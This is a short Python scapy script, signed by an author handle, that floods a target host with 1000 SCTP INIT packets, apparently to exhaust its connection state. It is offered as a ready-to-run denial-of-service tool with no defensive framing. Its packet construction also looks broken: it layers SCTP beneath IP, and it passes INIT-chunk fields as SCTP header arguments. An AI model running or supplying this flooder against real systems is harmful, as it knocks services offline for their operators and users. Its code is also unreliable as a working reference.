from scapy.all import *
# Written by Lithiokride

# Parameters
source_port = 5000        # Source port
destination_port = 5001   # Destination port
source_ip = "192.168.1.100"  # Source IP address
destination_ip = "192.168.1.200"  # Destination IP address
packet_count = 1000       # Number of packets to send

# Function to create and send SCTP INIT packet
def sctp_init_flood():
    for _ in range(packet_count):
        sctp_init = (
            SCTP(
                sport=source_port,
                dport=destination_port,
                type=SCTP_INIT,  # Indicates this is an INIT packet
                tag=1,           # A randomly chosen tag
                cumtsn=0,       # Cumulative TSN (initially 0)
                init_tsns=[1]   # Initial TSN
            ) /
            IP(src=source_ip, dst=destination_ip)  # Wrap SCTP in IP
        )
        send(sctp_init, iface="eth0")  # Replace "eth0" with your network interface

    print(f"{packet_count} SCTP INIT packets sent.")

# Start the flood
sctp_init_flood()
